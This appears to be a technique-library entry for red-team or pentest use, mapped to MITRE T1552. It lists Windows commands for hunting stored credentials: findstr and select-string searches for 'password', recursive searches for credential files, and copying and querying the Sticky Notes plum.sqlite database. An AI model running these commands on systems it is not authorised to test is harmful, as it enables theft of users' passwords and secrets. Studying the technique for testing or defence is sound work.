---
description: |
  This attack focuses on discovering credentials or sensitive information in a wide variety of local and network files on Windows systems.
  Attackers may find cleartext or weakly protected passwords in documents, config files, database files (such as StickyNotes), or virtual disk images within user directories or share drives.

    Command Reference:
        findstr, select-string (PowerShell), dir /S /B, where /R, Get-ChildItem, DB Browser for SQLite, PSSQLite, strings

        Target: Windows systems with poorly secured user/network shares, common file artifacts, or sensitive files

command: |
  # Manual file content search for passwords in user Documents folder
  cd c:\Users\<username>\Documents & findstr /SI /M "password" *.xml *.ini *.txt

code: |
  # 1. Search Documents and other likely directories for password strings in common files
  findstr /SI /M "password" *.xml *.ini *.txt

  # 2. Recursively find files matching sensitive patterns/extensions
  dir /S /B *pass*.txt *cred* *.config*

  # 3. Use PowerShell for targeted regex searches
  select-string -Path C:\Users\<username>\Documents\*.txt -Pattern password

  # 4. Identify and download Sticky Notes database
  copy C:\Users\<username>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite*

  # 5. Analyze Sticky Notes using PowerShell + PSSQLite or with DB Browser for SQLite
  Import-Module .\PSSQLite.psd1
  Invoke-SqliteQuery -Database .\plum.sqlite -Query "SELECT Text FROM Note"

  # 6. Grep for secrets in database files using strings
  strings plum.sqlite | findstr /i password

  # 7. Search common sensitive system/user files for useful artifacts
  dir /S /B C:\ProgramData\Configs\*
  dir /S /B C:\inetpub\wwwroot\web.config
  dir /S /B %USERPROFILE%\ntuser.dat

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
references:
  - https://attack.mitre.org/techniques/T1552/
  - https://posts.specterops.io/practical-dpapi-abuse-automation
---